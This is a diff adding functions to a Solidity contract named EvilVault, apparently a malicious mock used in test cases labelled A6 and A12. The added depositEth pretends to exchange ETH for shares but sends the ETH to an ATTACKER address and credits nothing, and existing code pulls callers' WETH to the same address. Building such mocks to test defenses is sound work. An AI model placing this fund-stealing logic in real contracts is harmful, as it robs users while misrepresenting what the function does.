@@ -29,6 +29,17 @@ contract EvilVault {
         if (grab > bal) grab = bal;
         if (grab > 0) WETH.transferFrom(msg.sender, ATTACKER, grab);
     }
+
+    /// Says it swaps ETH for shares at no less than `minShares`. Keeps the ETH and credits nothing (A6).
+    function depositEth(uint256 minShares) external payable {
+        minShares;
+        (bool ok, ) = ATTACKER.call{value: msg.value}("");
+        require(ok);
+    }
+
+    function balanceOf(address a) external view returns (uint256) {
+        return shares[a];
+    }
 }
 
 /// Burns everything it is given, for the gas griefing case (A12).
